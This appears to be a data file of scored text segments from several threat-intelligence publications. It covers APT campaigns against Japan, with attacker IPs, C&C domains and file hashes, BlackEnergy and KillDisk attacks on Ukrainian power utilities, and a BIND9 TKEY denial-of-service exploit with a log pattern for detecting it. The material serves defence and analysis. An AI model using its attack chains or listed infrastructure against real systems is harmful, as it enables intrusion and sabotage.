config\auto.json,0.008227404752310541
File to temporarily save configuration,0.00765822316257414
config\app.json,0.007763845201271269
Communication destination,0.008287183918884944
tools\getProxy.exe,0.008208552530964863
Tool to obtain proxy information,0.007657353557157465
tools\uninstaller.exe,0.00890701312080433
Tool to uninstall malware,0.007689296133660095
Table 4: Files created when infected2.,0.013417892301520684
4.4 Attack infrastructure,0.008053860854090877
The remote attack had several attributes corresponding with the attacker’s infrastructure. The attributes will be illustrated below.,0.009228096756769721
Attacking IP address,0.008755987363187279
"Although the remote exploit attack lasted a long time, only the three IP addresses listed below were used. In particular, 180.150.227.72 was used in many cases:",0.014741540831542443
107.189.139.237,0.01164974115651951
180.150.227.72,0.009962781845805013
27.255.84.171,0.009278316075605031
C&C server,0.007254074167762359
"Compromised websites were used as C&C servers in this attack, with ChinaChopper [19] installed as a backdoor. This C&C panel, to which malware is connected, is created in PHP. The data sent from the malware is stored on the server, but the C&C panel does not decrypt the data because there is no decryption key. The attackers also connect to the C&C panel in order to download data. Figure 18 shows the source code for the xxmm and Datper PHP panels – there are similarities in the features. The victim IP addresses connected to the C&C panel are from Korea, USA and Japan.",0.010264664278252567
"Figure 18: xxmm C&C panel source code (left: xxmm, right: Datper).",0.016479185160642618
The file ‘index_old.php’ was embedded by the attackers in many of the C&C servers. This PHP file is loaded on an infected website (Figure 19) and records the IP address and User-Agent of the users accessing the site in ‘htaccess.log’ (Figure 20). It is likely that BRONZE BUTLER selects an attack target based on these access logs. We observed many cases in which ‘index_old.php’ was embedded on Japanese websites.,0.012343796930680995
Figure 19: Infected website loading index_old.php.,0.012624483122820829
Figure 20: Access log recorded in htaccess.log.,0.01216235291206269
5. Discussion of APT campaigns targeting Japan,0.010567343041983812
The chart shown in Figure 21 describes the timeline of APT campaigns that targeted Japanese organizations.,0.020572566042841633
"As for the campaign conducted by APT10, spear-phishing emails were distributed to Japanese organizations in October 2016. The campaign is referred to as ‘Operation Cloud Hopper’ by PwC [20]. Different types of malware, such as ChChes [21] and RedLeaves [22], were used in the campaign. The spear-phishing emails impersonated a specific individual and were sent with a malware-embedded decoy document regarding international politics. Most of the emails were sent from free webmail services.",0.018789204115969405
"BlackTech is an APT group that is associated with malware such as TSCookie [23] (also referred to as ‘PLEAD’ by Trend Micro [24]). As an example, emails that impersonated the Ministry of Education, Culture, Sports, Science and Technology of Japan and that led to TSCookie infection were distributed in January 2018.",0.019258055596444112
"In the Winnti group’s attack campaign, code-signing certificates were stolen, which were used illegitimately to authenticate malware and attack tools. The Winnti malware [25] used in the campaign has three file components: an installer, a loader (to load the malware), and the malware itself. From 2015 to 2016, a particular sector was targeted by this campaign, which resulted in code‑signing certificates being stolen and Winnti malware infection in victim organizations.",0.01318542812163348
"This section describes the attack campaigns observed in Japan, which were conducted by the following APT groups by leveraging the vulnerabilities described in Chapters 2 to 4.",0.009446586435842175
APT17,0.00927373522693331
Cloudy Omega / Blue Termite,0.010448032476381819
BRONZE BUTLER,0.008593501832055095
Figure 21: APT campaign timelines.,0.020883975184963433
5.1 APT17,0.008022038210725668
Attack timeline,0.008551824434229194
"From August to September 2013, watering hole attacks leveraging a zero-day vulnerability in Internet Explorer were observed. The August campaign is referred to as ‘Operation DeputyDog’ [26] and the September campaign as ‘Operation Ephemeral Hydra’ [27] (both by FireEye), and the series of attacks are considered to be related.",0.014099124953108721
"In 2014 through to 2015, malware that had been used in Operation DeputyDog was distributed by compromising software updating systems (a so-called ‘supply chain attack’). IP addresses that were used in the supply chain attack in 2015 were also referred to in the IoCs associated with APT17 in a FireEye report [28].",0.018156794742753335
Initial access,0.007084215103905223
APT17 actors used watering hole attacks and supply chain attacks as a means to gain initial access to victim networks.,0.02139684230647776
Watering hole attack,0.007860754609697373
"The watering hole attacks observed in August 2013 leveraged a zero-day vulnerability in Internet Explorer (CVE-2013-3893) [29] and eventually infected victims with Agtid (see section 3). The attacks observed in September 2013 leveraged another zero-day vulnerability in Internet Explorer (CVE-2013-3918) [30]. In these cases, the PlugX malware, a plug-in-based bot known as McRAT and a tunnelling tool, Htran [31], were later found in the victim’s environment.",0.016172922292963632
"In the watering hole attack observed in 2014, the domain registration information of a legitimate website had been altered so that the name resolution was performed on a DNS server that the attacker had configured. The server processed DNS queries only for certain subdomains according to the iptable’s rules, and other DNS queries were transferred to a legitimate DNS server (Figure 22).",0.018265635196196506
Figure 22: Domain name hijacking.,0.017157207662683582
Supply chain attack,0.008601402385839951
"In the supply chain attack, altered files on legitimate update servers or DNAT configuration changes in iptables resulted in software update requests being redirected to an illegitimate server (Figure 23). If the software update downloaded from the malicious server was executed, the device was then infected with a downloader, and a bot program was installed. Analysis of an affected device revealed that it was also infected with several types of malware such as Agtid, Derusbi [32] and BLACKCOFFEE [33].",0.01618179257329444
"The compromised update server was found embedded with the backdoor program ‘mod_rootme’ [34], which operates as an apache module. Mod_rootme can send HTTP requests with specific strings included so that the remote attacker can access the backdoor with root privileges. In addition, the ‘pam_unix.so’ module on the server was also compromised, allowing any user to log in with a specific password and harvest credentials of legitimate users who had logged into the service. .htaccess and iptables in the server used as an infrastructure were configured to accept access from the IP address range that belongs to the target organizations.",0.011535212126560501
Figure 23: Update hijacking.,0.013921122972399003
Lateral movement,0.008767543863343108
"Devices that were infected with the bot program in the initial access phase were then remotely controlled by the attacker via commands provided from a C&C server, and reconnaissance activities were conducted. In addition to the standard Windows commands and Active Directory tools (e.g. dsget [35] and dsquery [36]) used to steal network and Active Directory information, other tools for network scans, SQL server investigation and password hash dumps were also used. After harvesting the domain admin’s credentials, remote attackers gained access to the domain controller using the pass-the-hash technique.",0.015511216828956842
5.2 Cloudy Omega / Blue Termite,0.008339947324627062
Attack timeline,0.008551824434229194
"According to Symantec, the Emdivi malware, which is related to the APT campaigns referred to as ‘Cloudy Omega’ by Symantec and as ‘Blue Termite’ by Kaspersky, has been seen since 2011 [37].",0.016013907507695713
"In 2013, a compromised website was found embedded with a Java Applet which leverages a Java vulnerability (CVE-2011-3544) [38], resulting in Emdivi being downloaded to visitors’ devices (a drive-by download attack). From May 2014 to September 2015, spear-phishing emails leading to Emdivi infection were distributed to a number of organizations in Japan.",0.011577715461684623
Initial access,0.007084215103905223
"Spear-phishing emails and a watering hole attack were the main attack vectors for initial access. In 2014 and 2015, numerous spear-phishing emails impersonating a health insurance society were observed (Figure 24). Most of the emails had the Emdivi executable file attached, with a fake icon. Emails observed in November 2014 had a document attachment leveraging an Ichitaro vulnerability (CVE-2014-7247) (see section 3).",0.019093005599811308
"In July 2015, drive-by download attacks leading to Emdivi infection were confirmed. Attackers leveraged a zero-day vulnerability in Adobe Flash Player (which was disclosed by Hacking Team [39]) to spread malware.",0.009957318815904004
Figure 24: A spear-phishing email impersonating a health insurance society.,0.01972588789837071
Lateral movement,0.008767543863343108
"After successfully intruding into the target’s network through Emdivi-infected devices, attackers investigated the network drive using standard Windows commands such as ‘net’ and ‘wmic’. When they found a file they wanted, they compressed it with WinRAR and send it to a C&C server using the Emdivi download command. The compressed file was then deleted so that there would be no evidence.",0.013317278409511246
"In addition, attackers used Active Directory tools such as csvde [40] and dsquery to dump or search for credentials. Vulnerabilities in the kernel-mode driver (CVE-2014-4113) [41] and Kerberos KDC (CVE-2014-6324) [42] were leveraged for privilege escalation, and tools such as Quarks PwDump [43], Mimikatz [44] and Windows Credential Editor [45] were used for credential harvesting.",0.014888008651243734
"Once the attackers had obtained domain admin credentials, they copied malware to other devices and registered the task to execute it taking advantage of the privilege. Devices that were affected by the secondary infection had a downloader installed, which was configured to communicate only on certain days of the week. Even if the first affected device was repaired or replaced, attackers were still able to distribute Emdivi to other infected devices through the downloader and were able to maintain a continuous presence on the victim’s network.",0.01649032830550068
5.3 BRONZE BUTLER / Tick,0.008897709523861264
Attack timeline,0.008551824434229194
"Symantec reports that the attack campaign by BRONZE BUTLER (referred to as ‘Tick’ by Symantec) started around 2006 [46]. In 2015, watering hole attacks leveraging a zero-day vulnerability in Adobe Flash Player (disclosed by Hacking Team) were observed. Since 2016, scans targeting a vulnerability in asset management software have been observed, which was still ongoing in 2018 (see section 4).",0.01297543697445247
Initial access,0.007084215103905223
"While a watering hole attack was the major attack vector during 2014 and 2015, since 2016 the attack has begun with scans targeting a vulnerability in asset management software. According to some public reports, spear-phishing emails were also used prior to 2014. The attackers attempt to infect victims with a downloader, such as Wali, by leveraging a vulnerability so that an HTTP bot is downloaded from a C&C server to the victim’s environment. Until early 2016 the HTTP bot used in the attack was Daserf; from mid-2015 to mid-2016 the Delphi version of Daserf was used, and after that it shifted to xxmm and Datper.",0.01008620433227847
Lateral movement,0.008767543863343108
"Once the attackers had entered a victim’s network through a bot-infected device, they created batch files to collect network environment information using standard Windows commands (e.g. dir, net, tasklist, ipconfig). Using the Domain Admin’s privilege, they executed the ‘net use’ command to connect to remote devices and send files with ‘copy’ and ‘move’ commands. Other commands used were ‘at’ and ‘schtacks’ to register tasks, and ‘Psexec’ in Windows Sysinternals [47] to execute files.",0.017192314566738198
"Collected information was compressed to a certain size using WinRAR and divided into pieces. After having been sent to an external server, it was deleted. The compressed file, including the header, was encrypted by WinRAR. Even if the file is recovered, the compressed contents cannot be retrieved unless the password is available. In some cases, the attackers sent files to an external server using free file upload services.",0.0113542437608104
"During the lateral movement phase, Mimikatz and Windows Credential Editor were used to harvest credentials and create golden/silver tickets. While a vulnerability in the SMBv1 protocol (MS17-010) [48] was addressed and a patch was released in March 2017, a tool which exploits this vulnerability, known as ‘Double Pulsar’, was used for lateral movement in April 2017.",0.011927500206527997
"Attackers set up a VBScript-based downloader in a victim’s device to perform communication with a C&C server only once upon the user’s login. This way, the attackers were able to maintain access to the network for a while.",0.013511463471473917
Conclusion,0.008171308922719556
"In this paper, we described targeted attacks against Japanese organizations exploiting three different zero-day vulnerabilities. The software in these cases is used only in Japan and is not distributed outside of the country. Nevertheless, the APT groups investigated these software vulnerabilities and leveraged them for attacks. Unlike more popular software, it is often the case that countermeasures against vulnerabilities in such region-specific software are not well prepared. Attackers understand and aim at such weak points. In preparation for future APT cases, security countermeasures for local software also need to be considered. As well as supply chain attacks, the targeting of local software vulnerabilities continues to be a problem. Details of attacks that target local software vulnerabilities are not usually available outside of the country in question, but ideally such information should also be published in the future. Such information will help analysts to better understand the threat landscape in different regions and could be useful in considering countermeasures against similar attacks in their own regions.",0.018183297523291397
References,0.0158494738281566
"[1] Cha, M (J). VB2018 paper: Since the hacking of Sony Pictures. https://www.virusbulletin.com/virusbulletin/2018/11/vb2018-paper-hacking-sony-pictures/.",0.01265463874963757
[2] Japan Vulnerablility Note: JVNDB-2014-000011 Sanshiro Series vulnerable to arbitrary code execution. https://jvndb.jvn.jp/en/contents/2014/JVNDB-2014-000011.html.,0.007911482683472304
[3] Trend Micro security blog: Confirmed zero-day attack leveraging Japanese spreadsheet software “Sanshiro” (Japanese). https://blog.trendmicro.co.jp/archives/8529.,0.009290280431208942
"[4] Haruyama, T.; Suzuki, H. I Know You Want Me – Unplugging PlugX. Black Hat Asia 2014. https://www.blackhat.com/docs/asia-14/materials/Haruyama/Asia-14-Haruyama-I-Know-You-Want-Me-Unplugging-PlugX.pdf.",0.01475325949280415
[5] Microsoft Security Bulletin: MS12-027 – Critical. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-027.,0.014516361800357092
[6] Adobe Security Advisories: APSA11-04 – Security Advisory for Adobe Reader and Acrobat. https://www.adobe.com/support/security/advisories/apsa11-04.html.,0.017855157427373092
[7] Japan Vulnerablility Note: JVNDB-2013-000103 Ichitaro series vulnerable to arbitrary code execution. https://jvndb.jvn.jp/en/contents/2013/JVNDB-2013-000103.html.,0.007830288238277028
[8] JustSystems Corporation: Possible execution of malicious program leveraging Sanshiro vulnerability (Japanese). https://www.justsystems.com/jp/info/js14001.html.,0.009123802965054773
[9] Attackers Target Organizations in Japan; Transform Local Sites into C&C Servers for EMDIVI Backdoor. TrendLabs Security Intelligence Blog. https://blog.trendmicro.com/trendlabs-security-intelligence/attackers-target-organizations-in-japan-transform-local-sites-into-cc-servers-for-emdivi-backdoor/.,0.01471197423276771
"[10] Moran, N.; Villeneuve, N. Operation DeputyDog: Zero-Day (CVE-2013-3893) Attack Against Japanese Targets. FireEye. https://www.fireeye.com/blog/threat-research/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html.",0.011752013745833567
"[11] Ishimaru, S. New activity of The Blue Termite APT. Securelist. https://securelist.com/new-activity-of-the-blue-termite-apt/71876/.",0.01259888071118409
[12] Hiding in Plain Sight: FireEye and Microsoft Expose Chinese APT Group’s Obfuscation Tactic. FireEye. https://www.fireeye.com/blog/threat-research/2015/05/hiding_in_plain_sigh.html.,0.0164112697593628
[13] JVNDB-2016-000249: SKYSEA Client View vulnerable to arbitrary code execution. https://jvndb.jvn.jp/en/contents/2016/JVNDB-2016-000249.html.,0.00745694312754086
[14] Secureworks: BRONZE BUTLER Targets Japanese Enterprises. https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses.,0.013122688028573193
"[15] Dahan, A. Cybereason: ShadowWali: New variant of the xxmm family of backdoors. https://www.cybereason.com/labs-blog/labs-shadowwali-new-variant-of-the-xxmm-family-of-backdoors.",0.012370558216087901
"[16] Ishimaru, S. Securelist: Old Malware Tricks To Bypass Detection in the Age of Big Data. https://securelist.com/blog/research/78010/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/.",0.014019133833699682
[17] Detecting Datper Malware from Proxy Logs. JPCERT/CC. https://blogs.jpcert.or.jp/en/2017/08/detecting-datper-malware-from-proxy-logs.html.,0.009835116140434974
[18] ReflectiveDLLInjection. GitHub. https://github.com/stephenfewer/ReflectiveDLLInjection.,0.0099325423468698
[19] China Chopper. MITRE ATT&CK. https://attack.mitre.org/software/S0020/.,0.011408368691193771
[20] Operation Cloud Hopper. PwC UK. https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html.,0.014002888315464479
[21] ChChes – Malware that Communicates with C&C Servers Using Cookie Headers. JPCERT/CC. https://blogs.jpcert.or.jp/en/2017/02/chches-malware--93d6.html.,0.009973856399348224
[22] RedLeaves – Malware Based on Open Source RAT. JPCERT/CC. https://blogs.jpcert.or.jp/en/2017/04/redleaves---malware-based-on-open-source-rat.html.,0.01069787546860046
[23] Malware “TSCookie”. JPCERT/CC. https://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html.,0.010942487597312867
"[24] Bermejo, L.; Huang, R.; Lei, CH. Following the Trail of BlackTech’s Cyber Espionage Campaigns. Trend Micro blog. https://blog.trendmicro.com/trendlabs-security-intelligence/following-trail-blacktech-cyber-espionage-campaigns/.",0.015687630025068344
[25] Winnti Analysis. Novetta. https://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf.,0.012784385545668742
"[26] Caselden, D.; Chen, X. Operation DeputyDog Part 2: Zero-Day Exploit Analysis (CVE‑2013-3893). FireEye. https://www.fireeye.com/blog/threat-research/2013/09/operation-deputydog-part-2-zero-day-exploit-analysis-cve-2013-3893.html.",0.011012568984968163
"[27] Moran, N.; Omkar Vashisht, S.; Scott, M. Thoufique Haq Operation Ephemeral Hydra: IE Zero-Day Linked to DeputyDog Uses Diskless Method. FireEye. http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html.",0.009926965685512767
[28] fireeye/iocs/APT17/7b9e87c5-b619-4a13-b862-0145614d359a.ioc. GitHub. https://github.com/fireeye/iocs/blob/master/APT17/7b9e87c5-b619-4a13-b862-0145614d359a.ioc.,0.011723794655457587
[29] Microsoft Security Advisory 2887505. https://docs.microsoft.com/en-us/security-updates/securityadvisories/2013/2887505.,0.014073674174938544
[30] Microsoft Security Bulletin MS13-090 – Critical. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2013/ms13-090.,0.014997216825414328
[31] HTRAN. MITRE ATT&CK. https://attack.mitre.org/software/S0040/.,0.008733955324827902
[32] Derusbi. Novetta. https://www.novetta.com/wp-content/uploads/2014/11/Derusbi.pdf.,0.01024308794942319
[33] BLACKCOFFEE. MITRE ATT&CK. https://attack.mitre.org/software/S0069/.,0.012770702616029639
[34] mod_rootme. GitHub. https://github.com/jingchunzhang/backdoor_rootkit/tree/master/mod_rootme-0.4.,0.010458965370776618
[35] Microsoft docs: Dsget. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v%3dws.11).,0.012843736852714338
[36] Microsoft docs: Dsquery. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v%3Dws.11).,0.011328113074134616
[37] Operation CloudyOmega: Ichitaro zero-day and ongoing cyberespionage campaign targeting Japan. Symantec. https://www.symantec.com/connect/blogs/operation-cloudyomega-ichitaro-zero-day-and-ongoing-cyberespionage-campaign-targeting-japan.,0.014492810458397787
[38] Oracle: Oracle Java SE Critical Patch Update Advisory – October 2011. https://www.oracle.com/technetwork/topics/security/javacpuoct2011-443431.html.,0.013544954854157965
[39] Adobe Help Center: APSB15-16. https://helpx.adobe.com/security/products/flash-player/apsb15-16.html.,0.01724040568433438
[40] Microsoft docs: Csvde. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732101(v%3Dws.11).,0.011890049285106175
[41] Microsoft Security Bulletin MS14-058 – Critical. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-058.,0.013908682878370215
[42] Microsoft Security Bulletin MS14-068 – Critical. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068.,0.014085014856002553
[43] Quarks PwDump. Quarkslab. https://blog.quarkslab.com/quarks-pwdump.html.,0.011018810533104273
[44] Mimikatz. GitHub. https://github.com/gentilkiwi/mimikatz.,0.013521481532636104
[45] Amplia Security: Research. http://www.ampliasecurity.com/research.html.,0.011480440771361344
[46] ick cyberespionage group zeros in on Japan. Symantec. https://www.symantec.com/connect/blogs/operation-cloudyomega-ichitaro-zero-day-https://www.symantec.com/connect/blogs/tick-cyberespionage-group-zeros-japan.,0.012879170077351842
[47] Microsoft Docs: PsExec – Windows Sysinternals. https://docs.microsoft.com/en-us/sysinternals/downloads/psexec.,0.011955770531575594
[48] Microsoft Security Bulletin MS17-010 – Critical. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010.,0.014678685179098205
Appendix: IoCs,0.008876707070792356
SHA 256,0.009973160232878309
Section 2,0.008633889292708252
d35238d8847e757c09551fce51572a388d82ece7aadcb7d65284ae84bd2f22a8,0.009749856531040213
74b7b7eb372d1b345199f107ee8cc5476dfe4cacc9163c326b37155ccf97e9e9,0.010080972688348622
8e82b3531a9a6abfeb115dcbf952ac3d0cd8e7c6f39b6108f8be2e621f9f73fe,0.010079195325651824
b0ddac69576dfc1ebd02e195b29b19812547758043c13acd4ffa408f954bc7e2,0.010094265216693765
Section 3,0.008675395850809342
CVE-2014-7247 (Ichitaro document),0.012210862146583956
920300763729a300863c5de1b3850f2ceac2c7688011d8423f80d3989dbd8a1f,0.010279283153195928
c4a6588e642dcc7d66c71c179417dc14a784600c709c69a8946158ce2daf1fae,0.010638272587001674
1eac1ee41016f4b515874f66a5c03b35fc07ad35073b58583861f0d08cd887dd,0.01018336049939872
04283696b53c5d37f9b960172ec57f214b3291f48315d1116bc8d1707c789111,0.010388495291242639
32dad1b131ecfa3e4efb8f9069fae46247bf0a4550163cad172cc9bb688c4fb0,0.009871343058026505
dd06173751257c9a8f24babbc1179e433f1bae5c2b841763b95c1c6890e5b983,0.009827477825024467
4b4584f2d7f1bedd225538ecf4086a06eb600c62cc5f6b0226e9c571cd1d2cc5,0.01033327573101206
Emdivi,0.009037495535881068
a79cfba79489d45a928ef3794d361898a2da4e1af4b33786d1e0d2759f4924c3,0.010082946197430998
b19a233b07a1342f867aef1b3fb3e473b875bd788832bb9422cacb5df1bda04e,0.010393203925209482
PlugX,0.0068115458700628295
da9090105d40c48b007526ad262de695f67ab7b18e4fe6274d55877821353366,0.009661080463956195
e7a60eec1f66ac089f13f9478dcf06b922bfe4b4f3a4fbbbf054e3202e58519a,0.010370527948585062
Section 4,0.00859935250395738
00000001.BIN,0.007810051258952955
3955d0340ff6e625821de294acef4bdc0cc7b49606a984517cd985d0aac130a3,0.009769386397357693
a52c3792d8cef6019ce67203220dc191e207c6ddbdfa51ac385d9493ffe2a83a,0.010108144900113802
54f61561a7c5eed7a5eacf298c74ee761b2b398f1db333318140ef2cb672b740,0.009735035185771013
a3145107e2d9b4899263b34e37786719f865efb54d97b6cac65ef1a2e3924838,0.009663484669342082
5c2599fdba24fef1a867552eed0f681ebfb07b47468fdf2a54a85b94fcd0d6f0,0.010568059791036588
app.js,0.007294745358383259
f36db81d384e3c821b496c8faf35a61446635f38a57d04bde0b3dfd19b674587,0.009915094719218032
f71a3a772f4316ab3c940f94aab3d52eabe7ee9da311b112a12eacfcadddb85e,0.010327867462650797
getProxy.exe,0.00829963373249154
c6cf0ad6d1e687b185407ee450a5b8e9a8ab60461f5c051251badb245df6245f,0.009837282463809327
uninstaller.exe,0.008445531360102843
d1617e7ec278484920c05476eabf783d399d6c03e8d8ab69e2f1fcb6a76417b4,0.010513985871715259
C&C servers,0.007987159866593596
Section 2,0.008633889292708252
ngm.dnsdynamic.com,0.010125911175125846
mysql.b0ne.com,0.009021519161519387
service.chatnook.com,0.00945715433571459
inter.so-webmail.com,0.00877532450669194
103.246.112.123,0.010069076240707298
Section 3,0.008675395850809342
Emdivi,0.009037495535881068
www.dolf.org.hk,0.010390842269718759
PlugX,0.0068115458700628295
sstday.Jkub.com,0.010429776449974781
whellbuy.wschandler.com,0.008936869496814714
Section 4,0.00859935250395738
www.rakutenline.com,0.010371721773133391
menu.rakutenline.com,0.009537899691010487
www.sa-guard.com,0.01106495470815072
menu.sa-guard.com,0.008861630621269545
www.han-game.com,0.010490185543339026
menu.han-game.com,0.009774924451570577
daydreamsig.com,0.010245891819345543
rsbuae.com,0.008958367463376748
Attacking IP addresses,0.009341606555036464
Section 4,0.00859935250395738
107.189.139.237,0.01164974115651951
180.150.227.72,0.009962781845805013
27.255.84.171,0.009278316075605031
Backdoor access IP addresses,0.005961787018187614
Section 4,0.00859935250395738
116.193.152.47,0.010398056602167194
1.226.83.34,0.007843484938480083
115.68.52.11,0.009537003002728306
Footnotes,0.008231263626591545
1 TSUBAME is a packet traffic monitoring system used to observe suspicious scanning activities.,0.01397654853138719
"2 All files and folders are created under %APPDATA%\Adobe\flash\[random 4-digit alphanumeric string]\bin.
",0.01067791453458955
"BlackEnergy trojan strikes again: Attacks Ukrainian electric power industry
The recent attacks on the electrical power industry in Ukraine are connected to attacks on the media and to targeted cyber-espionage attacks against Ukrainian governmental agencies.",0.018882022613345484
Robert Lipovsky,0.009327268366459585
Anton Cherepanov,0.012177145254436028
4 Jan 2016 - 12:49PM,0.011211295609380945
The recent attacks on the electrical power industry in Ukraine are connected to attacks on the media and to targeted cyber-espionage attacks against Ukrainian governmental agencies.,0.018425379328577574
"On December 23rd, 2015, around half of the homes in the Ivano-Frankivsk region in Ukraine (population around 1.4 million) were left without electricity for a few hours. According to the Ukrainian news media outlet TSN, the cause of the power outage was a “hacker attack” utilizing a “virus”.",0.013247360624768056
"Looking at ESET’s own telemetry, we have discovered that the reported case was not an isolated incident and that other energy companies in Ukraine were targeted by cybercriminals at the same time.",0.013470136092641027
"Furthermore, we found out that the attackers have been using a malware family on which we have had our eye for quite some time now: BlackEnergy. Specifically, the BlackEnergy backdoor has been used to plant a KillDisk component onto the targeted computers that would render them unbootable.",0.011059617307750846
(Un)related events?,0.014831723191795487
"The BlackEnergy trojan has been used for various purposes in the past few years. At the Virus Bulletin conference in 2014, we discussed a series of cyber-espionage attacks against high-value, government-related targets in Ukraine. The malware operators have used numerous spreading mechanisms to infect their victims, including the infamous PowerPoint 0-day CVE-2014-4114. While the primary objectives of the 2014 attacks appeared to be espionage, the discovery of BlackEnergy trojan-droppers capable of infecting SCADA Industrial Control Systems hinted that the gang might be up to something more dramatic.",0.012712518952857854
"In the recent attacks against electricity distribution companies in Ukraine, a destructive KillDisk trojan was downloaded and executed on systems previously infected with the BlackEnergy trojan.",0.014517984323799471
"The link between BlackEnergy and KillDisk was first reported by CERT-UA in November. In that instance, a number of news media companies were attacked at the time of the 2015 Ukrainian local elections. The report claims that a large number of video materials and various documents have been destroyed as a result of the attack.",0.0113102291948608
Electricity distribution companies under attack,0.007453587063341427
"Currently we know of several electricity distribution companies in Ukraine (other than the medialized case of Prykarpattya Oblenergo, already picked up by the media) that have been targeted by cybercriminals. We can confirm that the BlackEnergy backdoor was used against some of them and that the destructive KillDisk component was also used in more recent cases observed during the week of Christmas Eve, 2015. Additionally, BlackEnergy was also detected at electricity companies earlier in 2015; while we have no indication of KillDisk being used at that time, it is possible that the cybercriminals were then at the preparatory stage of the attack.",0.015011574292378094
"The infection vector used in these attacks is Microsoft Office files containing malicious macros. We have observed the BlackEnergy gang using this common technique, also employed by Dridex and other gangs, throughout 2015.",0.023885291125159136
"The attack scenario is simple: the target gets a spear-phishing email that contains an attachment with a malicious document. The Ukrainian security company CyS Centrum published two screenshots of emails used in BlackEnergy campaigns, where the attackers spoofed the sender address to appear to be one belonging to Rada (the Ukrainian parliament). The document itself contains text trying to convince the victim to run the macro in the document. This is an example where social engineering is used instead of exploiting software vulnerabilities. If victims are successfully tricked, they end up infected with BlackEnergy Lite.",0.018402612726724832
"As explained in our Virus Bulletin talk, the BlackEnergy trojan is modular and employs various downloadable components to carry out specific tasks. In the case of the most recent attack in Ukraine, the Win32/KillDisk malware was found on the infected system.",0.012903467453694861
As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems.,0.012505745922682276
"Firstly, it was possible to set a specific time delay after which the destructive payload was activated. Then, apart from the regular KillDisk functionality, it would try to terminate two non-standard processes: komut.exe and sec_service.exe. The second process, sec_service.exe, may belong to software called ELTIMA Serial to Ethernet Connector or to ASEM Ubiquity, a platform commonly used in Industrial Control Systems (ICS). If this process is found on the target system, the trojan will not only terminate it but will also overwrite its corresponding executable file on the hard drive with random data in order to make restoration of the system more difficult.",0.011076412744617126
Conclusion,0.008171308922719556
"Destructive malware is not a new phenomenon. While even some of the earliest viruses used to have destructive functionality intended mostly as a prank, today’s cybercriminals use such components for a number of reasons, ranging from sabotage, or hacktivism, to covering their tracks after a successful cyber-espionage attack. The Flamer (a.k.a. Flame or sKyWIper) malware is one of the most notorious examples. A data-wiping component has, reportedly, also been used in the attack against Sony Pictures. It should be clear, though, that a trojan capable of ‘wiping’ files or a few sectors of a hard-drive is not exactly unique and if we take into account the imprecise nature of malware naming (many such trojans have been called ‘Wiper’, or a similar derivative of the word), then speculations, unsubstantiated correlations and linking of unrelated incidents are bound to happen.",0.010786791501478321
"Even the BlackEnergy malware family has used a dstr destructive plugin in 2014. However, unlike the recent KillDisk variants used in attacks against media companies and the electricity distribution industry, it appeared as a generic ‘self-destruct’ component and we are not sure of its intended purpose.",0.01574701611636553
"Our analysis of the destructive KillDisk malware detected in several electricity distribution companies in Ukraine indicates that it is theoretically capable of shutting down critical systems. However, there is also another possible explanation. The BlackEnergy backdoor, as well as a recently discovered SSH backdoor, themselves provide attackers with remote access to infected systems. After having successfully infiltrated a critical system with either of these trojans, an attacker would, again theoretically, be perfectly capable of shutting it down. In such case, the planted KillDisk destructive trojan would act as a means of making recovery more difficult.",0.014931846111318925
We can assume with a fairly high amount of certainty that the described toolset was used to cause the power outage in the Ivano-Frankivsk region.,0.014794988132084796
"Although in Ukraine, Christmas is traditionally not celebrated on December 24th and 25th, a group of cybercriminals has chosen this time of year to deliver a dark ‘present’ to a few hundred thousand people and many more might have also been this ‘lucky’, had the malware not been detected.",0.0164028970502047
"For further information on the situation, thoughts and takeaways, read this post on the SANS Industrial Control Systems Security Blog. Additional details on the malware used in the attacks and Indicators of Compromise can be found in our technical blog post.
",0.011446990870646934
BIND9 – Denial of Service Exploit in the Wild,0.006666074000622024
"BIND is one of the most popular DNS servers in the world. It comes bundled with almost every cPanel, VPS and dedicated server installation and is used by most DNS providers.
A week ago, the Internet Systems Consortium (ISC) team released a patch for a serious denial of service vulnerability (CVE-2015-5477) that allows a remote and unauthenticated attacker to crash the BIND (named) daemon, taking down a DNS server.
This happens because of an error in the way BIND handles TKEY queries, which with a single UDP packet can trigger a required assertion failure, causing the DNS daemon to exit.
Exploits in the Wild
Because of its severity we’ve been actively monitoring to see when the exploit would be live. We can confirm that the attacks have begun. DNS is one of the most critical parts of the Internet infrastructure, so having your DNS go down also means your email, HTTP and all other services will be unavailable.",0.011933966158573117
"If You Have Not Patched Your DNS Server, Do it Now!
All major Linux distributions (Redhat, Centos, Ubuntu, etc) have already provided patches for it and a simple “yum update” on Redhat/Centos or “apt-get update” on Debian-based systems will get you protected. Remember though, for the change to take affect you must restart BIND after the update.
If you run your own DNS server, a quick way to see if you are being targeted is to look for the “ANY TKEY” in your DNS logs:
Aug 2 10:32:48 dns named[2717]: client a.b.c.d#42212 (foo.bar): view north_america: query: foo.bar ANY TKEY + (x.y.z.zz)
In fact, you can look for any type of TKEY request, as they are not very common, and see if there have been any attempts. The example above is from one of the public exploits released. Note that you need to have querylog enabled (which you can do with the command “rndc querylog on“).
Clients using our DNS server, part of our Website Firewall, are already protected against this vulnerability. For existing customers, you can enable the use of our DNS manager and find instructions in our knowledgebase.
",0.012444552621624916
"New Flash Player Zero-Day in The Wild (updated)
Update(2): 10/16
Adobe releases a fix to patch this vulnerability with Flash Player version 19.0.0.226. You should download the latest version immediately if you are using Flash.",0.01249825329391241
